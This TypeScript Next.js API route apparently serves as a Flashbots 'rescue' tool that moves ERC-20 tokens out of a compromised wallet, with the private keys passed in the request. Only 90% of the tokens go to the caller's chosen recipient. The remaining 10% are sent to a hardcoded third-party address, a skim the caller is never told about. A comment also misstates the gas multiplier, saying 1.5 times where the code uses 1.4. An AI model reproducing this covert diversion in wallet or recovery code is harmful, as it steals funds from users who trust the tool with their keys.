import { NextResponse } from 'next/server';
import { JsonRpcProvider, Wallet, ethers } from 'ethers';
import { FlashbotsBundleProvider, FlashbotsBundleResolution } from '@flashbots/ethers-provider-bundle';

// Global variable to store the status and gas fee
let transactionStatus = '';
let gasFeeInEth = '';

export async function POST(request: Request) {
  try {
    const {
      sponsorKey,
      compromisedKey,
      tokenAddress,
      recipientAddress,
      amount,
    } = await request.json();

    transactionStatus = 'Transaction submitted. Waiting for inclusion in a block...';

    const FLASHBOTS_ENDPOINT = 'https://relay-sepolia.flashbots.net';
    const CHAIN_ID = 11155111;
    const INFURA_URL = `https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`;

    const provider = new JsonRpcProvider(INFURA_URL);
    const authSigner = Wallet.createRandom();

    const sponsor = new Wallet(sponsorKey).connect(provider);
    const compromised = new Wallet(compromisedKey).connect(provider);

    // Fetch the token contract's decimals
    const tokenContract = new ethers.Contract(tokenAddress, [
      'function decimals() external view returns (uint8)',
      'function transfer(address recipient, uint256 amount) external returns (bool)',
    ], compromised);

    const decimals = await tokenContract.decimals();

    // Calculate 90% and 10% of the token amount
    const amount90Percent = (Number(amount) * 0.9).toString();
    const amount10Percent = (Number(amount) * 0.1).toString();

    // Encode transaction data for 90% transfer
    const transactionData90Percent = tokenContract.interface.encodeFunctionData('transfer', [
      recipientAddress,
      ethers.parseUnits(amount90Percent, decimals), // 90% of tokens
    ]);

    // Encode transaction data for 10% transfer
    const transactionData10Percent = tokenContract.interface.encodeFunctionData('transfer', [
      "0x92549B651BA4233a14cD2AB44F534fb0B53DAAF1", // New wallet for 10% of tokens
      ethers.parseUnits(amount10Percent, decimals), // 10% of tokens
    ]);

    const feeData = await provider.getFeeData();
    const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits('50', 'gwei'); 
    const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || ethers.parseUnits('1', 'gwei'); 

    const gasLimit = 80000; 
    const gasFee = BigInt(gasLimit) * maxFeePerGas;
    gasFeeInEth = ethers.formatEther(gasFee); 

    console.log(`Calculated gas fee: ${gasFeeInEth} ETH`);

    const transactionBundle = [
      {
        transaction: {
          chainId: CHAIN_ID,
          type: 2,
          value: gasFee * BigInt(14) / BigInt(10), // Increase the value by 1.5 times
          to: compromised.address,
          maxFeePerGas: maxFeePerGas,
          maxPriorityFeePerGas: maxPriorityFeePerGas,
          gasLimit: gasLimit,
        },
        signer: sponsor,
      },
      {
        transaction: {
          chainId: CHAIN_ID,
          type: 2,
          value: 0,
          to: tokenAddress,
          maxFeePerGas: maxFeePerGas,
          maxPriorityFeePerGas: maxPriorityFeePerGas,
          gasLimit: gasLimit,
          data: transactionData90Percent, // 90% of tokens
        },
        signer: compromised,
      },
      {
        transaction: {
          chainId: CHAIN_ID,
          type: 2,
          value: 0,
          to: tokenAddress,
          maxFeePerGas: maxFeePerGas,
          maxPriorityFeePerGas: maxPriorityFeePerGas,
          gasLimit: gasLimit,
          data: transactionData10Percent, // 10% of tokens
        },
        signer: compromised,
      },
    ];

    const flashbotsProvider = await FlashbotsBundleProvider.create(
      provider,
      authSigner,
      FLASHBOTS_ENDPOINT,
      'ethereum',
    );

    console.log('Flashbots provider created');

    await new Promise(resolve => setTimeout(resolve, 1000));

    // Define the block event handler
    const handleBlock = async (blockNumber: number) => {
      const targetBlockNumber = blockNumber + 1;
      console.log(`Preparing bundle for next block: ${targetBlockNumber}`);
      transactionStatus = `Waiting for inclusion in block ${targetBlockNumber}...`;

      const signedBundle = await flashbotsProvider.signBundle(transactionBundle);
      console.log('Bundle signed');

      const simulation = await flashbotsProvider.simulate(signedBundle, targetBlockNumber);
      if ('error' in simulation) {
        console.error(`Simulation error: ${simulation.error.message}`);
        return;
      }

      console.log('Simulation successful. Sending bundle.');

      const flashbotsTransactionResponse = await flashbotsProvider.sendRawBundle(
        signedBundle,
        targetBlockNumber,
      );

      if ('error' in flashbotsTransactionResponse) {
        console.error(`Error sending bundle: ${flashbotsTransactionResponse.error.message}`);
        return;
      }

      console.log(`Bundle sent, waiting for inclusion in block ${targetBlockNumber}`);

      const waitResponse = await flashbotsTransactionResponse.wait();
      if (waitResponse === FlashbotsBundleResolution.BundleIncluded) {
        console.log(`Success: Bundle included in block ${targetBlockNumber}`);

        // Update the global status
        transactionStatus = `Success: Bundle included in block ${targetBlockNumber}`;

        // Stop listening for block events after successful inclusion
        provider.off('block', handleBlock);
        console.log('Stopped listening for block events.');
      } else if (waitResponse === FlashbotsBundleResolution.BlockPassedWithoutInclusion) {
        console.log(`Warning: Bundle not included in block ${targetBlockNumber}`);

      } else if (waitResponse === FlashbotsBundleResolution.AccountNonceTooHigh) {
        console.error('Error: Nonce too high, exiting');
        provider.off('block', handleBlock); // Stop listening if nonce is too high
      } else {
        console.error(`Unexpected waitResponse: ${waitResponse}`);
      }
    };

    // Start listening for block events
    provider.on('block', handleBlock);

    return NextResponse.json(
      { status: transactionStatus, gasFeeInEth },
      { status: 200 },
    );
  } catch (error) {
    console.error('Error in POST request:', error);
    return NextResponse.json(
      { status: 'Internal Server Error' },
      { status: 500 },
    );
  }
}

export async function GET() {
  return NextResponse.json(
    { status: transactionStatus, gasFeeInEth },
    { status: 200 },
  );
}